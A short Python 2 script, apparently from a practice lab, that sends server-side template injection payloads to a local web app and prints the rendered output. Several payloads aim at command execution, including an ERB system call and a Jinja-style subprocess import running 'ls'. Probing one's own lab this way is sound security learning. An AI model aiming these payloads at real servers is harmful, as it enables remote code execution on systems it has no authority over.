import requests
import re
import HTMLParser
import base64

def sendPayload(payload_arg="me"):
    url = "http://127.0.0.1:5003/"
    result1 = requests.post(url,data={"name":payload_arg}).text
    return result1
    
#this exploit returns true if successful
payload='<%=system( "touch attackerFile" )%>'
payload ='<%=%x(ls )%> '
payload ='{{__import__("subprocess").check_output("ls")}}'
payload = '{{}}'
payload ='{{ name.class }}'
payload = '''{% if name.class == "Adrian" %}
   lalalalal
{% else %}
   sory
{% endif %}
'''
payload ='{{ this }}'


'''
['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', 
'__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__',
 '__gt__', '__hash__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__mod__',
  '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__',
   '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'capitalize',
    'casefold', 'center', 'count', 'encode', 'endswith', 'expandtabs', 'find', 'format',
     'format_map', 'index', 'isalnum', 'isalpha', 'isdecimal', 'isdigit', 'isidentifier',
      'islower', 'isnumeric', 'isprintable', 'isspace', 'istitle', 'isupper', 'join',
       'ljust', 'lower', 'lstrip', 'maketrans', 'partition', 'replace', 'rfind',
        'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines',
         'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']
'''





resutl = sendPayload(payload)

try:
    regex = r"<h2>Hello([\s\S]*)</h2>"
    matches = re.findall(regex,resutl)
    print HTMLParser.HTMLParser().unescape(matches[0])
except:
    print "RESULT ERROR:\n"+resutl.encode('utf-8')


